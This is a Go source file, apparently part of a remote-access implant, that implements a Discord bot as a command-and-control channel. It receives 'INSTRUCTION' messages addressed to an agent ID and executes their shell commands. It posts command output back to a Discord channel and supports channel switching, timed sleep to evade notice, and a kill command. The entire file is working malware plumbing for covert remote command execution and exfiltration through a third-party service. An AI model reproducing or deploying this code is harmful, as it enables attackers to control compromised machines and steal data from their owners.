package discord

import (
	"context"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"agent/core"

	"github.com/bwmarrin/discordgo"
)

// ─────────────────────────────────────────
// Client — implements core.C2Channel
// ─────────────────────────────────────────

type Client struct {
	token     string
	agentID   string
	session   *discordgo.Session
	execute   core.ExecuteFunc
	channelID string // discovered from first INSTRUCTION received

	// Switch signaling
	switchCh chan string
	mu       sync.Mutex
}

// NewClient creates a Discord C2 channel.
func NewClient(token string, agentID string, exec core.ExecuteFunc) *Client {
	return &Client{
		token:    token,
		agentID:  agentID,
		execute:  exec,
		switchCh: make(chan string, 1),
	}
}

// ─────────────────────────────────────────
// C2Channel interface implementation
// ─────────────────────────────────────────

func (c *Client) Name() string { return "discord" }

func (c *Client) Connect() error {
	dg, err := discordgo.New("Bot " + c.token)
	if err != nil {
		return fmt.Errorf("discord session creation failed: %w", err)
	}

	dg.AddHandler(c.messageHandler)
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentMessageContent

	if err := dg.Open(); err != nil {
		return fmt.Errorf("discord connection failed: %w", err)
	}

	c.session = dg
	log.Printf("[%s] Connected", c.Name())
	return nil
}

func (c *Client) Listen(ctx context.Context) error {
	log.Printf("[%s] Listening for commands...", c.Name())

	select {
	case <-ctx.Done():
		log.Printf("[%s] Shutting down listener", c.Name())
		return nil
	case targetChannel := <-c.switchCh:
		log.Printf("[%s] Received SWITCH command → %s", c.Name(), targetChannel)
		return &core.SwitchError{TargetChannel: targetChannel}
	}
}

func (c *Client) Disconnect() error {
	if c.session != nil {
		c.session.Close()
		log.Printf("[%s] Disconnected", c.Name())
	}
	return nil
}

func (c *Client) SendMessage(text string) error {
	c.mu.Lock()
	chID := c.channelID
	c.mu.Unlock()

	if chID == "" {
		// If we don't have a channel ID yet, send to ALL guilds' first text channel
		for _, g := range c.session.State.Guilds {
			channels, err := c.session.GuildChannels(g.ID)
			if err != nil {
				continue
			}
			for _, ch := range channels {
				if ch.Type == discordgo.ChannelTypeGuildText {
					_, err := c.session.ChannelMessageSend(ch.ID, text)
					if err == nil {
						c.mu.Lock()
						c.channelID = ch.ID
						c.mu.Unlock()
						return nil
					}
				}
			}
		}
		return fmt.Errorf("no writable channel found")
	}

	_, err := c.session.ChannelMessageSend(chID, text)
	return err
}

// ─────────────────────────────────────────
// Message handler (runs via discordgo events)
// ─────────────────────────────────────────

func (c *Client) messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore our own messages
	if m.Author.ID == s.State.User.ID {
		return
	}

	raw := m.Content
	if raw == "" {
		return
	}

	// Remember the channel we receive messages on
	c.mu.Lock()
	if c.channelID == "" {
		c.channelID = m.ChannelID
	}
	c.mu.Unlock()

	// ── SWITCH|<agent_id>|<channel_name> ──
	if strings.HasPrefix(raw, "SWITCH|") {
		parts := strings.SplitN(raw, "|", 3)
		if len(parts) == 3 && parts[1] == c.agentID {
			// Signal the Listen() goroutine
			select {
			case c.switchCh <- parts[2]:
			default:
			}
		}
		return
	}

	// ── INSTRUCTION|<agent_id>|<instr_id>|<command> ──
	if strings.HasPrefix(raw, "INSTRUCTION|") {
		parts := strings.SplitN(raw, "|", 4)
		if len(parts) != 4 {
			return
		}

		// Filter: only process instructions for our agent ID
		if parts[1] != c.agentID {
			return
		}

		instr := core.Instruction{
			ID:      parts[2],
			Command: parts[3],
		}

		log.Printf("[%s] [%s] $ %s", c.Name(), instr.ID, instr.Command)
		go c.handleInstruction(s, m, instr)
		return
	}

	// ── Control commands (case-insensitive, from server bot) ──
	if m.Author.Bot {
		lower := strings.ToLower(raw)
		switch {
		case lower == "!sleep":
			go c.sleep(s, m, false)
		case lower == "!deep_sleep":
			go c.sleep(s, m, true)
		case lower == "!wakeup":
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("RESULT|%s|SYSTEM|Acknowledged. Standing by.", c.agentID))
		case lower == "!status":
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("RESULT|%s|SYSTEM|Online and ready.", c.agentID))
		case lower == "!kill":
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("RESULT|%s|SYSTEM|Shutting down.", c.agentID))
			s.Close()
		}
	}
}

// ─────────────────────────────────────────
// Internal helpers
// ─────────────────────────────────────────

func (c *Client) handleInstruction(s *discordgo.Session, m *discordgo.MessageCreate, instr core.Instruction) {
	output := c.execute(instr.Command)

	// Discord has a 2000 char message limit — truncate if needed
	if len(output) > 1800 {
		output = output[:1800] + "\n... (truncated)"
	}

	// RESULT|<agent_id>|<instr_id>|<output>
	result := fmt.Sprintf("RESULT|%s|%s|%s", c.agentID, instr.ID, output)
	if _, err := s.ChannelMessageSend(m.ChannelID, result); err != nil {
		log.Printf("[%s] Failed to send result for %s: %v", c.Name(), instr.ID, err)
	} else {
		log.Printf("[%s] [%s] Result sent", c.Name(), instr.ID)
	}
}

func (c *Client) sleep(s *discordgo.Session, m *discordgo.MessageCreate, deep bool) {
	s.Close()

	duration := 93 * time.Second
	if deep {
		duration = 1 * time.Hour
	}

	log.Printf("[%s] Sleeping for %v", c.Name(), duration)
	time.Sleep(duration)

	if err := s.Open(); err != nil {
		log.Printf("[%s] Failed to wake up: %v", c.Name(), err)
		return
	}

	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("RESULT|%s|SYSTEM|Back online.", c.agentID))
}
